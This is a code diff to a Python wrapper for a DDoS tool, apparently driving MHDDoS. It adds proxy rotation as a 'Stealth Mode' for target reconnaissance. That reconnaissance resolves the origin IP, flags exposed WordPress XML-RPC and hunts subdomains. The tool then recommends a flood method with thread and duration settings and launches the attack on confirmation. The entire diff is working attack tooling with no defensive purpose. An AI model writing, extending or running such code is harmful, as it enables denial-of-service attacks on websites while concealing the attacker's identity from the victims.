@@ -2,6 +2,7 @@
 import os
 import sys
 import subprocess
+import random
 
 class bcolors:
     HEADER = '\033[95m'
@@ -103,7 +104,7 @@ def main():
     # MHDDoS/VanHelsing structure: python3 start.py <METHOD> <URL> <PROXY_TYPE> <THREADS> <PROXY_FILE> <RPC> <DURATION>
 
     cmd = [
-        "python3", "start.py",
+        sys.executable, "start.py",
         method,
         target,
         proxy_type,
@@ -143,6 +144,24 @@ def run_intel():
         target_url = f"https://{target}"
 
     print("-" * 40)
+    
+    # [PHASE 21] Stealth Mode (Proxy Support)
+    use_proxy = False
+    proxies = None
+    print(f"{bcolors.WARNING}[?] Enable Stealth Mode (Use Proxies for Scan)? (y/n): {bcolors.RESET}", end="")
+    if input().lower().startswith("y"):
+        use_proxy = True
+        print(f"{bcolors.OKCYAN}[*] Loading proxies from proxy.txt...{bcolors.RESET}")
+        try:
+            with open("proxy.txt", "r") as f:
+                proxy_list = [line.strip() for line in f if line.strip()]
+            if not proxy_list:
+                print(f"{bcolors.FAIL}[!] proxy.txt is empty! Falling back to direct connection.{bcolors.RESET}")
+                use_proxy = False
+        except FileNotFoundError:
+             print(f"{bcolors.FAIL}[!] proxy.txt not found! Falling back to direct connection.{bcolors.RESET}")
+             use_proxy = False
+
     print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
     
     resolved_ip = None
@@ -180,8 +199,20 @@ def run_intel():
         
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
         
+        def get_req_kwargs():
+            kwargs = {'headers': headers, 'timeout': 10, 'verify': False}
+            if use_proxy and proxy_list:
+                # Rotation logic
+                p = random.choice(proxy_list)
+                # Basic format handling
+                if "://" not in p:
+                     p = f"http://{p}"
+                kwargs['proxies'] = {'http': p, 'https': p}
+            return kwargs
+
         # 1. Base Check
-        r = requests.head(target_url, headers=headers, timeout=5, verify=False)
+        kwargs = get_req_kwargs()
+        r = requests.head(target_url, **kwargs)
         server_header = r.headers.get('Server', 'Unknown')
         powered_by = r.headers.get('X-Powered-By', 'Unknown')
         
@@ -189,7 +220,9 @@ def run_intel():
         print("[*] Checking for WordPress XML-RPC...", end="\r")
         try:
             xml_url = f"{target_url}/xmlrpc.php"
-            r_xml = requests.get(xml_url, headers=headers, timeout=5, verify=False)
+            # Rotate proxy again for next request
+            kwargs = get_req_kwargs()
+            r_xml = requests.get(xml_url, **kwargs)
             if r_xml.status_code == 405 or "XML-RPC server accepts POST requests only" in r_xml.text:
                 print(f"[*] XML-RPC      : {bcolors.FAIL}VULNERABLE (Use Menu 4!){bcolors.RESET}   ")
                 cms_detected = "WordPress"
@@ -264,7 +297,8 @@ def run_intel():
         # Get Main Site Signature
         main_sig = 0
         try:
-            r_main = requests.get(target_url, headers=headers, timeout=5, verify=False)
+            kwargs = get_req_kwargs()
+            r_main = requests.get(target_url, **kwargs)
             main_sig = len(r_main.content)
             print(f"[*] Main Site Size : {main_sig} bytes")
         except:
@@ -292,7 +326,8 @@ def run_intel():
                         
                         try:
                             # Verify Content
-                            r_check = requests.get(f"http://{sub_domain}", headers=headers, timeout=3)
+                            kwargs = get_req_kwargs()
+                            r_check = requests.get(f"http://{sub_domain}", **kwargs)
                             check_sig = len(r_check.content)
                             
                             # Simple +/- 10% size tolerance or exact title match logic
@@ -351,7 +386,7 @@ def run_intel():
              args = [rec_method, target_url, "7", "100", "proxy.txt", "50", "800"]
 
 
-        cmd_string = f"python3 start.py {' '.join(args)}"
+        cmd_string = f"{sys.executable} start.py {' '.join(args)}"
 
         print(f"Method : {bcolors.FAIL}{rec_method}{bcolors.RESET}")
         print(f"Reason : {reason}")
@@ -360,11 +395,9 @@ def run_intel():
         print(f"\n{bcolors.WARNING}[?] Execute this attack now? (y/n): {bcolors.RESET}", end="")
         q = input().lower()
         if q.startswith("y"):
-             cmd = ["python3", "start.py"] + args
+             cmd = [sys.executable, "start.py"] + args
              try:
                 subprocess.run(cmd)
-             except KeyboardInterrupt:
-                pass
              except Exception as e:
                 print(f"Error: {e}")
 
